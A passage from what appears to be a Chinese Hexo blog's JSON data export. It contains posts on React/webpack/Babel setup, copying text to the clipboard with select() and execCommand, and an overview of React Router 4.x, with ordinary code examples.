\"^4.0.1\",</span><br><span class=\"line\">    \"redux-saga\": \"^1.0.4\",</span><br><span class=\"line\">    \"webpack\": \"^4.35.0\",</span><br><span class=\"line\">    \"webpack-cli\": \"^3.3.5\",</span><br><span class=\"line\">    \"webpack-dev-server\": \"^3.7.2\"</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  \"dependencies\": &#123;</span><br><span class=\"line\">    \"react\": \"^16.8.6\",</span><br><span class=\"line\">    \"react-dom\": \"^16.8.6\"</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// .babelrc</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"@babel/preset-env\"</span>, <span class=\"string\">\"@babel/preset-react\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: [</span><br><span class=\"line\">    [</span><br><span class=\"line\">      <span class=\"string\">\"@babel/plugin-transform-runtime\"</span>,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"corejs\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"helpers\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"regenerator\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"useESModules\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\">  <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: <span class=\"regexp\">/\\.js$/</span>,</span><br><span class=\"line\">        exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">'babel-loader'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://zh-hans.reactjs.org/docs/getting-started.html\" target=\"_blank\" rel=\"noopener\">https://zh-hans.reactjs.org/docs/getting-started.html</a></p>"},{"title":"js复制文本到剪贴板","date":"2019-06-28T06:15:47.000Z","updated":"2019-06-28T06:15:47.000Z","_content":"\n# 概述\n\n实现点击按钮复制指定的内容到黏贴板，主要涉及两个 API`element.select()`和`document.execCommand()`。本文将介绍基本实现及常见坑，最后是推荐一个不错的第三方库。\n![示例图](demo.jpg)\n\n<!-- more -->\n\n# 详述\n\n实际场景是：系统要提供一个批量上传商品的功能，但是上传的 Excel 文件中需要制定商品属于哪个类目，因此需要提供一个交互是用户选择类目然后可点击按钮复制类目码。示例图如上。\n\n## select 方法\n\nselect() 方法用于选择该元素中的文本。\n\n### 语法\n\n```js\ntextareaObject.select();\n```\n\n### 注意点\n\n该元素为可编辑文本的元素，如 textarea、input([type=text])，因此常见坑有：\n\n1. 该元素设置了 hidden 属性；\n2. 该元素设置了 disabled 属性；\n3. 该元素为`<input type=\"hidden\">`；\n4. input 元素的 width 或者 height 为 0；\n\n## execCommand 方法\n\n当一个 HTML 文档切换到设计模式时，document 暴露 execCommand 方法，该方法允许运行命令来操纵可编辑内容区域的元素。\n\n### 语法\n\n```js\nbool = document.execCommand(aCommandName, aShowDefaultUI, aValueArgument);\n```\n\naCommandName：一个 DOMString ，命令的名称。可用命令列表请参阅 [命令](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand#%E5%91%BD%E4%BB%A4) 。\n\naShowDefaultUI：一个 Boolean， 是否展示用户界面，一般为 false。Mozilla 没有实现。\n\naValueArgument：一些命令（例如 insertImage）需要额外的参数（insertImage 需要提供插入 image 的 url），默认为 null。\n\n## 实现点击复制示例\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>js复制</title>\n  </head>\n  <body>\n    <textarea id=\"text\" style=\"width: 0\">hello JovySun</textarea>\n    <!-- <input type=\"text\" value=\"hello JovySun\" id=\"text\" hidden> -->\n    <button id=\"btn\">click</button>\n    <script>\n      window.onload = function(event) {\n        var button = document.getElementById(\"btn\");\n        button.onclick = function(event) {\n          document.getElementById(\"text\").select();\n          document.execCommand(\"copy\", false, null);\n        };\n      };\n    </script>\n  </body>\n</html>\n```\n\n## 第三方库\n\n[clipboardjs](https://clipboardjs.com/)，一种将文本复制到剪贴板的现代方法，无其他依赖，gzipe 压缩后只有 3kb。\n\n提供从其他元素复制，剪切文本，或者从自身属性复制文本的方法，另外也提供了 success 和 error 自定义事件方便你作进一步的交互反馈。\n\n浏览器支持 IE9+及其他所有主流现代浏览器。\n","source":"_posts/2019/06/js-copy.md","raw":"---\ntitle: js复制文本到剪贴板\npermalink: js-copy\ntags:\n  - JavaScript\ncategories:\n  - 其他\ndate: 2019-06-28 14:15:47\nupdated: 2019-06-28 14:15:47\n---\n\n# 概述\n\n实现点击按钮复制指定的内容到黏贴板，主要涉及两个 API`element.select()`和`document.execCommand()`。本文将介绍基本实现及常见坑，最后是推荐一个不错的第三方库。\n![示例图](demo.jpg)\n\n<!-- more -->\n\n# 详述\n\n实际场景是：系统要提供一个批量上传商品的功能，但是上传的 Excel 文件中需要制定商品属于哪个类目，因此需要提供一个交互是用户选择类目然后可点击按钮复制类目码。示例图如上。\n\n## select 方法\n\nselect() 方法用于选择该元素中的文本。\n\n### 语法\n\n```js\ntextareaObject.select();\n```\n\n### 注意点\n\n该元素为可编辑文本的元素，如 textarea、input([type=text])，因此常见坑有：\n\n1. 该元素设置了 hidden 属性；\n2. 该元素设置了 disabled 属性；\n3. 该元素为`<input type=\"hidden\">`；\n4. input 元素的 width 或者 height 为 0；\n\n## execCommand 方法\n\n当一个 HTML 文档切换到设计模式时，document 暴露 execCommand 方法，该方法允许运行命令来操纵可编辑内容区域的元素。\n\n### 语法\n\n```js\nbool = document.execCommand(aCommandName, aShowDefaultUI, aValueArgument);\n```\n\naCommandName：一个 DOMString ，命令的名称。可用命令列表请参阅 [命令](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand#%E5%91%BD%E4%BB%A4) 。\n\naShowDefaultUI：一个 Boolean， 是否展示用户界面，一般为 false。Mozilla 没有实现。\n\naValueArgument：一些命令（例如 insertImage）需要额外的参数（insertImage 需要提供插入 image 的 url），默认为 null。\n\n## 实现点击复制示例\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>js复制</title>\n  </head>\n  <body>\n    <textarea id=\"text\" style=\"width: 0\">hello JovySun</textarea>\n    <!-- <input type=\"text\" value=\"hello JovySun\" id=\"text\" hidden> -->\n    <button id=\"btn\">click</button>\n    <script>\n      window.onload = function(event) {\n        var button = document.getElementById(\"btn\");\n        button.onclick = function(event) {\n          document.getElementById(\"text\").select();\n          document.execCommand(\"copy\", false, null);\n        };\n      };\n    </script>\n  </body>\n</html>\n```\n\n## 第三方库\n\n[clipboardjs](https://clipboardjs.com/)，一种将文本复制到剪贴板的现代方法，无其他依赖，gzipe 压缩后只有 3kb。\n\n提供从其他元素复制，剪切文本，或者从自身属性复制文本的方法，另外也提供了 success 和 error 自定义事件方便你作进一步的交互反馈。\n\n浏览器支持 IE9+及其他所有主流现代浏览器。\n","slug":"js-copy","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d90s00acwovvteev3scz","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>实现点击按钮复制指定的内容到黏贴板，主要涉及两个 API<code>element.select()</code>和<code>document.execCommand()</code>。本文将介绍基本实现及常见坑，最后是推荐一个不错的第三方库。<br><img src=\"/js-copy/demo.jpg\" alt=\"示例图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>实际场景是：系统要提供一个批量上传商品的功能，但是上传的 Excel 文件中需要制定商品属于哪个类目，因此需要提供一个交互是用户选择类目然后可点击按钮复制类目码。示例图如上。</p>\n<h2 id=\"select-方法\"><a href=\"#select-方法\" class=\"headerlink\" title=\"select 方法\"></a>select 方法</h2><p>select() 方法用于选择该元素中的文本。</p>\n<h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">textareaObject.select();</span><br></pre></td></tr></table></figure>\n<h3 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h3><p>该元素为可编辑文本的元素，如 textarea、input([type=text])，因此常见坑有：</p>\n<ol>\n<li>该元素设置了 hidden 属性；</li>\n<li>该元素设置了 disabled 属性；</li>\n<li>该元素为<code>&lt;input type=&quot;hidden&quot;&gt;</code>；</li>\n<li>input 元素的 width 或者 height 为 0；</li>\n</ol>\n<h2 id=\"execCommand-方法\"><a href=\"#execCommand-方法\" class=\"headerlink\" title=\"execCommand 方法\"></a>execCommand 方法</h2><p>当一个 HTML 文档切换到设计模式时，document 暴露 execCommand 方法，该方法允许运行命令来操纵可编辑内容区域的元素。</p>\n<h3 id=\"语法-1\"><a href=\"#语法-1\" class=\"headerlink\" title=\"语法\"></a>语法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool = <span class=\"built_in\">document</span>.execCommand(aCommandName, aShowDefaultUI, aValueArgument);</span><br></pre></td></tr></table></figure>\n<p>aCommandName：一个 DOMString ，命令的名称。可用命令列表请参阅 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand#%E5%91%BD%E4%BB%A4\" target=\"_blank\" rel=\"noopener\">命令</a> 。</p>\n<p>aShowDefaultUI：一个 Boolean， 是否展示用户界面，一般为 false。Mozilla 没有实现。</p>\n<p>aValueArgument：一些命令（例如 insertImage）需要额外的参数（insertImage 需要提供插入 image 的 url），默认为 null。</p>\n<h2 id=\"实现点击复制示例\"><a href=\"#实现点击复制示例\" class=\"headerlink\" title=\"实现点击复制示例\"></a>实现点击复制示例</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>js复制<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">id</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 0\"</span>&gt;</span>hello JovySun<span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- &lt;input type=\"text\" value=\"hello JovySun\" id=\"text\" hidden&gt; --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"btn\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"btn\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        button.onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"text\"</span>).select();</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.execCommand(<span class=\"string\">\"copy\"</span>, <span class=\"literal\">false</span>, <span class=\"literal\">null</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"第三方库\"><a href=\"#第三方库\" class=\"headerlink\" title=\"第三方库\"></a>第三方库</h2><p><a href=\"https://clipboardjs.com/\" target=\"_blank\" rel=\"noopener\">clipboardjs</a>，一种将文本复制到剪贴板的现代方法，无其他依赖，gzipe 压缩后只有 3kb。</p>\n<p>提供从其他元素复制，剪切文本，或者从自身属性复制文本的方法，另外也提供了 success 和 error 自定义事件方便你作进一步的交互反馈。</p>\n<p>浏览器支持 IE9+及其他所有主流现代浏览器。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>实现点击按钮复制指定的内容到黏贴板，主要涉及两个 API<code>element.select()</code>和<code>document.execCommand()</code>。本文将介绍基本实现及常见坑，最后是推荐一个不错的第三方库。<br><img src=\"/js-copy/demo.jpg\" alt=\"示例图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>实际场景是：系统要提供一个批量上传商品的功能，但是上传的 Excel 文件中需要制定商品属于哪个类目，因此需要提供一个交互是用户选择类目然后可点击按钮复制类目码。示例图如上。</p>\n<h2 id=\"select-方法\"><a href=\"#select-方法\" class=\"headerlink\" title=\"select 方法\"></a>select 方法</h2><p>select() 方法用于选择该元素中的文本。</p>\n<h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">textareaObject.select();</span><br></pre></td></tr></table></figure>\n<h3 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h3><p>该元素为可编辑文本的元素，如 textarea、input([type=text])，因此常见坑有：</p>\n<ol>\n<li>该元素设置了 hidden 属性；</li>\n<li>该元素设置了 disabled 属性；</li>\n<li>该元素为<code>&lt;input type=&quot;hidden&quot;&gt;</code>；</li>\n<li>input 元素的 width 或者 height 为 0；</li>\n</ol>\n<h2 id=\"execCommand-方法\"><a href=\"#execCommand-方法\" class=\"headerlink\" title=\"execCommand 方法\"></a>execCommand 方法</h2><p>当一个 HTML 文档切换到设计模式时，document 暴露 execCommand 方法，该方法允许运行命令来操纵可编辑内容区域的元素。</p>\n<h3 id=\"语法-1\"><a href=\"#语法-1\" class=\"headerlink\" title=\"语法\"></a>语法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool = <span class=\"built_in\">document</span>.execCommand(aCommandName, aShowDefaultUI, aValueArgument);</span><br></pre></td></tr></table></figure>\n<p>aCommandName：一个 DOMString ，命令的名称。可用命令列表请参阅 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand#%E5%91%BD%E4%BB%A4\" target=\"_blank\" rel=\"noopener\">命令</a> 。</p>\n<p>aShowDefaultUI：一个 Boolean， 是否展示用户界面，一般为 false。Mozilla 没有实现。</p>\n<p>aValueArgument：一些命令（例如 insertImage）需要额外的参数（insertImage 需要提供插入 image 的 url），默认为 null。</p>\n<h2 id=\"实现点击复制示例\"><a href=\"#实现点击复制示例\" class=\"headerlink\" title=\"实现点击复制示例\"></a>实现点击复制示例</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>js复制<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">id</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 0\"</span>&gt;</span>hello JovySun<span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- &lt;input type=\"text\" value=\"hello JovySun\" id=\"text\" hidden&gt; --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"btn\"</span>&gt;</span>click<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"btn\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        button.onclick = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"text\"</span>).select();</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"built_in\">document</span>.execCommand(<span class=\"string\">\"copy\"</span>, <span class=\"literal\">false</span>, <span class=\"literal\">null</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"第三方库\"><a href=\"#第三方库\" class=\"headerlink\" title=\"第三方库\"></a>第三方库</h2><p><a href=\"https://clipboardjs.com/\" target=\"_blank\" rel=\"noopener\">clipboardjs</a>，一种将文本复制到剪贴板的现代方法，无其他依赖，gzipe 压缩后只有 3kb。</p>\n<p>提供从其他元素复制，剪切文本，或者从自身属性复制文本的方法，另外也提供了 success 和 error 自定义事件方便你作进一步的交互反馈。</p>\n<p>浏览器支持 IE9+及其他所有主流现代浏览器。</p>"},{"title":"React Router概览","date":"2019-07-12T01:02:54.000Z","updated":"2019-07-12T01:02:54.000Z","_content":"\n# 概述\n本文是对react-router4.x的一个概览（web应用部分），不涉及具体编码细节，只作脉络梳理。\n<!-- more -->\n\n# 详述\nReact Router是一组导航组件，支持Web应用与React Native应用。对应的npm包为`react-router-dom`与`react-router-native`，两者都集成了核心包`react-router`。在web分支，最基本的三个组件是总容器组件`BrowserRouter`、占位组件`Route`和链接导航组件`Link`，总容器包裹整个需要导航的组件，一般包裹所有应用组件；占位组件定义了路由匹配规则及符合规则的组件渲染于此；链接导航组件的原型是a标签，定义了路由名称及对应句柄展示内容。\n\n## 基本示例\n```js\nimport React from \"react\";\nimport { BrowserRouter as Router, Route, Link } from \"react-router-dom\";\n\nfunction Index() {\n  return <h2>Home</h2>;\n}\n\nfunction About() {\n  return <h2>About</h2>;\n}\n\nfunction Users() {\n  return <h2>Users</h2>;\n}\n\nfunction AppRouter() {\n  return (\n    <Router>\n      <div>\n        <nav>\n          <ul>\n            <li>\n              <Link to=\"/\">Home</Link>\n            </li>\n            <li>\n              <Link to=\"/about/\">About</Link>\n            </li>\n            <li>\n              <Link to=\"/users/\">Users</Link>\n            </li>\n          </ul>\n        </nav>\n\n        <Route path=\"/\" exact component={Index} />\n        <Route path=\"/about/\" component={About} />\n        <Route path=\"/users/\" component={Users} />\n      </div>\n    </Router>\n  );\n}\n\nexport default AppRouter;\n\n```\n## API\n- `<Router>`：所有路由器组件的通用底层接口。通常情况下，应用程序会使用其中一种高级路由器:`<BrowserRouter>、<HashRouter>、<MemoryRouter>、<NativeRouter>、<StaticRouter>`。\n- `<BrowserRouter>`：使用HTML5 history API的路由实现。\n- `<HashRouter>`：使用URL的hash特性的路由实现。\n- `<MemoryRouter>`：<Router>的一种实现，它将您的“URL”的历史记录保存在内存中(不读取或写入地址栏)。在测试和非浏览器环境(如React Native)中非常有用。\n- `<StaticRouter>`：`<Router>`的一种实现，一个从不改变位置的<路由器>，在服务器端和单元测试中很有用。\n- `<Link>`：提供声明性的、可访问的导航。\n- `<NavLink>`：特殊的`<Link>`，当它匹配当前URL时，将向呈现的元素添加样式属性。\n- `<Redirect>`：导航到一个新的位置，类别服务器端的重定向。\n- `<Route>`：核心组件，最基本的职责是在位置与路由路径匹配时呈现一些UI。\n- `<Switch>`：呈现与位置匹配的第一个子节点`<Route>`或`<Redirect>`。\n- `<Prompt>`：用于在离开页面之前提示用户。当您的应用程序进入一种应该防止用户导航离开的状态(就像表单只填写了一半)时，呈现一个<Prompt>。\n- history：待完善\n- location：待完善\n- match：待完善\n- matchPath：待完善\n- withRouter：待完善\n# 参考\n","source":"_posts/2019/07/react-router-overview.md","raw":"---\ntitle: React Router概览\npermalink: react-router-overview\ntags:\n  - React\ncategories:\n  - 框架与库\n  - React\ndate: 2019-07-12 09:02:54\nupdated: 2019-07-12 09:02:54\n---\n\n# 概述\n本文是对react-router4.x的一个概览（web应用部分），不涉及具体编码细节，只作脉络梳理。\n<!-- more -->\n\n# 详述\nReact Router是一组导航组件，支持Web应用与React Native应用。对应的npm包为`react-router-dom`与`react-router-native`，两者都集成了核心包`react-router`。在web分支，最基本的三个组件是总容器组件`BrowserRouter`、占位组件`Route`和链接导航组件`Link`，总容器包裹整个需要导航的组件，一般包裹所有应用组件；占位组件定义了路由匹配规则及符合规则的组件渲染于此；链接导航组件的原型是a标签，定义了路由名称及对应句柄展示内容。\n\n## 基本示例\n```js\nimport React from \"react\";\nimport { BrowserRouter as Router, Route, Link } from \"react-router-dom\";\n\nfunction Index() {\n  return <h2>Home</h2>;\n}\n\nfunction About() {\n  return <h2>About</h2>;\n}\n\nfunction Users() {\n  return <h2>Users</h2>;\n}\n\nfunction AppRouter() {\n  return (\n    <Router>\n      <div>\n        <nav>\n          <ul>\n            <li>\n              <Link to=\"/\">Home</Link>\n            </li>\n            <li>\n              <Link to=\"/about/\">About</Link>\n            </li>\n            <li>\n              <Link to=\"/users/\">Users</Link>\n            </li>\n          </ul>\n        </nav>\n\n        <Route path=\"/\" exact component={Index} />\n        <Route path=\"/about/\" component={About} />\n        <Route path=\"/users/\" component={Users} />\n      </div>\n    </Router>\n  );\n}\n\nexport default AppRouter;\n\n```\n## API\n- `<Router>`：所有路由器组件的通用底层接口。通常情况下，应用程序会使用其中一种高级路由器:`<BrowserRouter>、<HashRouter>、<MemoryRouter>、<NativeRouter>、<StaticRouter>`。\n- `<BrowserRouter>`：使用HTML5 history API的路由实现。\n- `<HashRouter>`：使用URL的hash特性的路由实现。\n- `<MemoryRouter>`：<Router>的一种实现，它将您的“URL”的历史记录保存在内存中(不读取或写入地址栏)。在测试和非浏览器环境(如React Native)中非常有用。\n- `<StaticRouter>`：`<Router>`的一种实现，一个从不改变位置的<路由器>，在服务器端和单元测试中很有用。\n- `<Link>`：提供声明性的、可访问的导航。\n- `<NavLink>`：特殊的`<Link>`，当它匹配当前URL时，将向呈现的元素添加样式属性。\n- `<Redirect>`：导航到一个新的位置，类别服务器端的重定向。\n- `<Route>`：核心组件，最基本的职责是在位置与路由路径匹配时呈现一些UI。\n- `<Switch>`：呈现与位置匹配的第一个子节点`<Route>`或`<Redirect>`。\n- `<Prompt>`：用于在离开页面之前提示用户。当您的应用程序进入一种应该防止用户导航离开的状态(就像表单只填写了一半)时，呈现一个<Prompt>。\n- history：待完善\n- location：待完善\n- match：待完善\n- matchPath：待完善\n- withRouter：待完善\n# 参考\n","slug":"react-router-overview","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d90u00adwovv4hdedg5q","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文是对react-router4.x的一个概览（web应用部分），不涉及具体编码细节，只作脉络梳理。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>React Router是一组导航组件，支持Web应用与React Native应用。对应的npm包为<code>react-router-dom</code>与<code>react-router-native</code>，两者都集成了核心包<code>react-router</code>。在web分支，最基本的三个组件是总容器组件<code>BrowserRouter</code>、占位组件<code>Route</code>和链接导航组件<code>Link</code>，总容器包裹整个需要导航的组件，一般包裹所有应用组件；占位组件定义了路由匹配规则及符合规则的组件渲染于此；链接导航组件的原型是a标签，定义了路由名称及对应句柄展示内容。</p>\n<h2 id=\"基本示例\"><a href=\"#基本示例\" class=\"headerlink\" title=\"基本示例\"></a>基本示例</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 